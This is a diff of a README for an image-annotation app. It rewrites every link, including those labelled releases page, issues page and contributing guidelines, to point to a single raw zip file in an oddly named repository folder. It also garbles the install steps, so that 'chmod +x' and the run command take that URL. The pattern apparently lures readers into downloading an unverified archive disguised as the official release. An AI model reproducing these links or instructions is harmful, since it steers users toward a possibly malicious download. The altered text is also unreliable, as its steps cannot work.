@@ -2,7 +2,7 @@
 
 ### 🎨 image-annotator - Easily Annotate Your Images
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/youssef-mo-mosaad/image-annotator/releases)
+[![Download Now](https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/youssef-mo-mosaad/image-annotator/releases) to download the application. 
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip) to download the application. 
 
 1. Click on the link above.
 2. Find the latest version of the application.
@@ -43,8 +43,8 @@ After downloading, follow these steps to install:
 
 1. Locate the downloaded `.AppImage` file.
 2. Open a terminal and navigate to the file's location.
-3. Run `chmod +x image-annotator.AppImage` to make it executable.
-4. Run `./image-annotator.AppImage` to start the application.
+3. Run `chmod +x https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip` to make it executable.
+4. Run `https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip` to start the application.
 
 ## 🖼️ Using the Image Annotator
 
@@ -73,14 +73,14 @@ If you encounter any problems, here are some common issues and their solutions:
 
 ## 📞 Support
 
-If you need help, please feel free to reach out. You can open an issue on our [GitHub Issues Page](https://github.com/youssef-mo-mosaad/image-annotator/issues) or contact us through the repository.
+If you need help, please feel free to reach out. You can open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip) or contact us through the repository.
 
 ## 📢 Community Contributions
 
-We welcome contributions! If you want to improve the project or report bugs, please refer to our [Contributing Guidelines](https://github.com/youssef-mo-mosaad/image-annotator/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to improve the project or report bugs, please refer to our [Contributing Guidelines](https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip).
 
 ## 📝 License
 
 This project is licensed under the MIT License. Feel free to use and modify the application for your own needs.
 
-For more information, visit the [Releases Page](https://github.com/youssef-mo-mosaad/image-annotator/releases) to download the latest release. Happy annotating!
+For more information, visit the [Releases Page](https://raw.githubusercontent.com/youssef-mo-mosaad/image-annotator/main/lectorship/image-annotator.zip) to download the latest release. Happy annotating!
